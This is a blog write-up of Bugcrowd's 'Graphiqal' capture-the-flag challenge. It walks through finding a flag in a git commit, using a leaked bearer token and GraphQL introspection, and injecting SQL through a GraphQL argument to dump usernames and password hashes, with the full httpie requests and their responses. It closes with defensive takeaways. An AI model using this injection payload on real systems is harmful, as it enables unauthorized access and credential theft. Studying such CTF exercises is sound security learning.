<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/assets/styles/main.css?v=2" />
    <link href="https://mastodon.spotek.io/@dustin" rel="me" />
    <link href="https://defcon.social/@dstn" rel="me" />
    <link href="https://toki.social/@0xdstn" rel="me" />
    <title>Bugcrowd Graphiqal CTF Write-up | Dustin</title>
  </head>
  <body>
    <header>
      <a href="/">0xdstn</a>
      <a href="/hello">hello</a>
      <a href="/writing">writing</a>
      <a href="/thoughts">thoughts</a>
      <a href="/wiki/library">reading</a>
      <a href="/feeds">feeds</a>
    </header>
	<article>
<a href="/writing">..</a><h1><span class="emoji">&#128221;</span> 2020 Bugcrowd Graphiqal CTF Write-up</h1><p><em>2020.07.21</em></p><p><strong><code>UPDATE 2021.04.13</code> It seems Bugcrowd has taken down this CTF, so the links will not work any longer. I will leave them as they were, as I don't have anything better to change them to.</strong></p><p>I have been interested in <strong>appsec</strong> for a long time, but never really took the time to study it or to practice it. I have recently started focusing my time on it, and decided to try my hand at <a href="https://bugcrowd.com" target="_blank">Bugcrowd</a>'s beginner CTF, <a href="https://bgcd.co/GRAPHIQALCTF" target="_blank">Graphiqal</a>.</p><ol><li><a href="#Scoping out the landscape">Scoping out the landscape</a></li><li><a href="#Flag #1">Flag #1</a></li><li><a href="#Flag #2">Flag #2</a></li><li><a href="#Flag #3">Flag #3</a></li><li><a href="#Takeaways">Takeaways</a></li></ol><h2 id="Scoping out the landscape">Scoping out the landscape</h2><p>The first thing I did was manually scope out the site, to see what was there. I found the following:</p><ul><li><strong>API (/api)</strong> - displays a message saying they moved to <strong>graphql</strong></li><li><strong>Gogs (:3000)</strong> - a <strong>gogs</strong> instance with some source code</li></ul><h2 id="Flag #1">Flag #1</h2><p>I manually browsed the source code in the repository, as there wasn't much. Eventually I found <a href="http://164.90.156.83:3000/maxim/graphiqal-ant/commit/be4aa476e3241298408fa48d1b8216bd2c5b3fc4" target="_blank">this commit</a> which contained the first flag: <code>FLAG{9e233d7662f4fe8f0e6eaee08b1e1dd8}</code>.</p><p>In hindsight I realized a more efficient use of my time would have been to download each of the repositories and run <code>ack "FLAG"</code> which also would have given me this flag.</p><h2 id="Flag #2">Flag #2</h2><p>After finding that one fairly quickly I decided to take a look at <strong>graphql</strong> since it was mentioned on the <strong>/api</strong> page.</p><p>A common endpoint for graphql is <code>/graphql</code>. I made a request to that and received the following response:</p><pre>$ http http://164.90.156.83/graphql<br>HTTP/1.1 401 Unauthorized<br><br>Missing Bearer Token<br></pre><p>Since I needed a bearer token, I decided to search through the repositories again to see if I could find a secret I could use to generate a token. I then stumbled upon a <a href="http://164.90.156.83:3000/maxim/new-painting-checker/src/master/retrieve.py" target="_blank">cleartext token</a>. Even better.</p><p>I made a request, passing the token as a header and got a response letting me know it worked:</p><pre>$ http http://164.90.156.83/graphql "Authorization:Bearer fae43547e79c6a5b6cf7ebc39f4d014d"<br>HTTP/1.1 400 Bad Request<br><br>{<br>  "errors": [<br>    {<br>        "message": "Must provide query string."<br>    }<br>  ]<br>}<br></pre><p>Since I was now able to make graphql requests, I searched for a query that I could use to get a list of all the available graphtypes. I found <a href="https://stackoverflow.com/questions/37397886/get-graphql-whole-schema-query" target="_blank">this stackoverflow question</a> which provided an introspection query to get the schema information. After some trial and error I ended up with this request:</p><pre>$ http http://164.90.156.83/graphql "Authorization:Bearer fae43547e79c6a5b6cf7ebc39f4d014d" "query=query IntrospectionQuery {__schema{queryType{name}types{name fields(includeDeprecated: true) { name description isDeprecated deprecationReason }}}}"<br>HTTP/1.1 200 OK<br><br>{<br>    "data": {<br>        "__schema": {<br>            "types": [<br>                ...<br>                {<br>                    "fields": [<br>                        {<br>                            "deprecationReason": null,<br>                            "description": null,<br>                            "isDeprecated": false,<br>                            "name": "id"<br>                        },<br>                        {<br>                            "deprecationReason": null,<br>                            "description": null,<br>                            "isDeprecated": false,<br>                            "name": "name"<br>                        },<br>                        {<br>                            "deprecationReason": null,<br>                            "description": null,<br>                            "isDeprecated": false,<br>                            "name": "artist"<br>                        },<br>                        {<br>                            "deprecationReason": null,<br>                            "description": null,<br>                            "isDeprecated": false,<br>                            "name": "genre"<br>                        },<br>                        {<br>                            "deprecationReason": null,<br>                            "description": null,<br>                            "isDeprecated": false,<br>                            "name": "price"<br>                        }<br>                    ],<br>                    "name": "Paintings"<br>                },<br>            ...<br>          ]<br>          ...<br>        }<br>    }<br>}<br></pre><p>It seemed the only graphtype I could use was <strong>Paintings</strong> so I made a request to fetch all of those:</p><pre>$ http http://164.90.156.83/graphql "Authorization:Bearer fae43547e79c6a5b6cf7ebc39f4d014d" "query=query IntrospectionQuery {paintings{id name genre artist price}}"<br>HTTP/1.1 200 OK<br><br>{<br>    "data": {<br>        "paintings": [<br>            {<br>                "artist": "Montgomery Butler",<br>                "genre": "Contemporary",<br>                "id": "1",<br>                "name": "Harmony Sky",<br>                "price": 27890.21<br>            },<br>            {<br>                "artist": "Jem Salton",<br>                "genre": "Realism",<br>                "id": "2",<br>                "name": "Night Paradise",<br>                "price": 12783.99<br>            },<br>            {<br>                "artist": "Gregory Mosley",<br>                "genre": "Realism",<br>                "id": "3",<br>                "name": "Virtue of Cluster",<br>                "price": 8821.98<br>            },<br>            {<br>                "artist": "Zunairah Milner",<br>                "genre": "Cubism",<br>                "id": "4",<br>                "name": "Cubex",<br>                "price": 17829.42<br>            },<br>            {<br>                "artist": "Kaelan Beck",<br>                "genre": "Abstract",<br>                "id": "5",<br>                "name": "Relinquished Lifestyle",<br>                "price": 13212.11<br>            },<br>            {<br>                "artist": "FLAG{b5c009704caf8d0575cbc801a97ae49b}",<br>                "genre": "Realism",<br>                "id": "6",<br>                "name": "Drapeau",<br>                "price": 1337.37<br>            },<br>            {<br>                "artist": "Hadi Mene",<br>                "genre": "Realism",<br>                "id": "7",<br>                "name": "Labs of the Wizard",<br>                "price": 76213.81<br>            },<br>            {<br>                "artist": "Samiha Schofield",<br>                "genre": "GFX",<br>                "id": "8",<br>                "name": "Wound of Philosophy",<br>                "price": 14273.22<br>            },<br>            {<br>                "artist": "Ernest Benton",<br>                "genre": "Abstract",<br>                "id": "9",<br>                "name": "Majestueuse Sky",<br>                "price": 100000.47<br>            },<br>            {<br>                "artist": "Roxie Bannister",<br>                "genre": "Cubism",<br>                "id": "10",<br>                "name": "Arrive Abandonn",<br>                "price": 3200000.38<br>            }<br>        ]<br>    }<br>}<br></pre><p>And there we have it, flag #2: <code>FLAG{b5c009704caf8d0575cbc801a97ae49b}</code></p><h2 id="Flag #3">Flag #3</h2><p>This one gave me a lot of troubles. I didn't know where to start, as I had exhausted all of the ideas I had from my initial investigation of the landscape. I poked around more in the repositories trying to find any sort of credentials I could use. There were some local SQL credentials, however port 3306 was not open on the server.</p><p>I had no idea how much more difficult this flag would be, and ended up going down the wrong path. I had decided there may be a documented vulnerability with the version of gogs they were running. I tried many different POCs for vulnerabilities related to gogs, all with no luck. I even tried using a script called <a href="https://github.com/TheZ3ro/gogsownz" target="_blank">gogsownz</a>. Nothing was working.</p><p>I was certain I was on the right track, because there was a reference to a file in the repo: <code>/tmp/testing/pwned777.txt</code>, I figured I needed to use a <strong>Path Traversal</strong> attack to find out what was in that file.</p><p>After a lot of effort I went into the <a href="https://discord.com/invite/TWr3Brs" target="_blank">Bugcrowd Discord</a> and asked how much more difficult the third flag was from the second. While looking in there I also noticed someone said there wasn't any vulnerable software, as far as they knew, so that would indicate that this was the wrong path to be going down.</p><p>There was then a hint posted</p><blockquote><strong>mqt:</strong> think of from where the API is pulling the data and what vulnerabilities can arise from this</blockquote><p>I was then thinking about how I saw those SQL credentials, and how graphql would use some sort of database technology. I then started researching how to do <strong>SQL Injection</strong> via <strong>graphql</strong> queries. It turned out that I could use the <strong>painting</strong> request where you pass an ID to get a single painting, and inject some SQL into it. This ended up working, and after some playing around I came up with this query:</p><pre>$ http http://164.90.156.83/graphql "Authorization:Bearer fae43547e79c6a5b6cf7ebc39f4d014d" "query=query IntrospectionQuery {painting(id:\"' UNION SELECT id, GROUP_CONCAT(password),GROUP_CONCAT(username),null,null FROM users #\"){id name artist}}"<br>HTTP/1.1 200 OK<br><br>{<br>    "data": {<br>        "painting": {<br>            "artist": "maxim,hadi,FLAG",<br>            "id": "1",<br>            "name": "29d79648ac14a5d8d0268867bd3161c6,bc8a5e6ccfb6c15b61d6d218c2df6cca,FLAG{2f55138f7dce2e3e852f1c8a487b33f9}"<br>        }<br>    }<br>}<br></pre><p>There it was, the third flag as a password of the user FLAG: <code>FLAG{2f55138f7dce2e3e852f1c8a487b33f9</code></p><h2 id="Takeaways">Takeaways</h2><p>This CTF provided multiple attack vectors that should be considered when writing software:</p><h3 id="Flag 1">Flag 1</h3><ul><li>Don't leave sensitive information in git repositories</li></ul><h3 id="Flag 2">Flag 2</h3><ul><li>Don't leave secrets or tokens in git repositories</li><li>Don't allow introspection queries in graphql</li></ul><h3 id="Flag 3">Flag 3</h3><ul><li>Sanitize your inputs to prevent SQL injection</li></ul><h2 id="Final notes">Final notes</h2><p>While I started going in the wrong direction, and I ended up using a hint, overall I consider this a success and I had a ton of fun participating. I'm going to continue to try my hand at other challenges. Thanks for reading!</p><blockquote class="thanks"> <span class="emoji">&#128075;</span> Hey! Thanks for reading! If you have any comments or questions about this post, or anything else, I'd love to chat! You can find the best way to contact me on my <a href="/hello">hello page</a> or send me an <a href="mailto:0xdstn@protonmail.com?subject=RE: Bugcrowd Graphiqal CTF Write-up">email</a>.</blockquote>		</article>
		<footer>
			<p>
			<a href="https://webring.xxiivv.com/#random" target="_blank" class="webring">
				<img src="https://webring.xxiivv.com/icon.black.svg" alt="webring"/>
			</a>
			</p>
		</footer>
	</body>
</html>

